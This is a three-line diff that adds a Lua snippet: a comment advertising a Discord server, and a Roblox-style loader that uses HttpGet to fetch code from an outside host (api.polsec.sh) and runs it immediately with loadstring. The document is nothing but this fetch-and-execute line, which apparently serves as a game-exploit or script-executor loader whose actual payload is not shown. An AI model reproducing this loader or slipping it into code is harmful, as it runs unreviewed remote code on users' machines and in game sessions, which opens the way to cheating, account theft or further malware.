@@ -1,0 +1,3 @@
+-- discord.gg/healthy
+
+loadstring(game:HttpGet("https://api.polsec.sh/loader/1d3bd07b2de036c7/04e00cf08974a0ae"))() 
